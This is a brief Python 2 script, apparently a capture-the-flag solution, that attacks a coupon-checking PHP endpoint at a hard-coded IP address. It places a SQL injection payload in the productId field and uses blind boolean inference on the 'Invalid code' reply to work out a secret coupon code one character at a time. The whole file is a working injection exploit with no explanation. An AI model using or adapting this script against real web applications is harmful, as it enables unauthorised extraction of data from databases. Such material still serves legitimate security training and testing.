import requests

url = 'http://139.180.137.27:11322/checkcoupon.php'

def checkcoupon(id, code):
	r = requests.post(url, data = {'productId': id, 'code': code})
	return r.text

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
parse_str = ''
coupon = ''

print 'Finding all possible characters:\n '
for c in chars:
    ret = checkcoupon('" OR BINARY CODE LIKE "%' + c + '%', 'abcd')
    if ret == 'Invalid code':
        parse_str += c
        print '==> ' + parse_str

print '\nFinding coupon:\n '
for i in range(17):
    for c in parse_str:
        ret = checkcoupon('" OR BINARY CODE LIKE "' + coupon + c + '%', 'abcd')
        if ret == 'Invalid code':
            coupon += c
            print '==> ' + coupon
            break
    
print '\n======> Coupon: ' + coupon
